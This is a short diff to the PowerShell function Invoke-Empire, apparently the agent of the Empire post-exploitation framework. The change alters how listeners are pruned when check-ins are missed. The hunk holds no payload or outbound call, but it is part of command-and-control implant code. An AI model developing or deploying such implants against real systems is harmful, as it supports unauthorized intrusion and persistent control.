@@ -760,7 +760,7 @@ function Invoke-Empire {
 	$script:CleanUpListeners = {
 		$newlisteners = @()
 		foreach ($l in $script:listeners){
-			if ($l["missedCheckins"] -lt $l["lostLimit"]){
+			if ( $l["lostLimit"] -ne 0 -and $l["missedCheckins"] -lt $l["lostLimit"]){
 				$newlisteners += $l
 			}
 		}
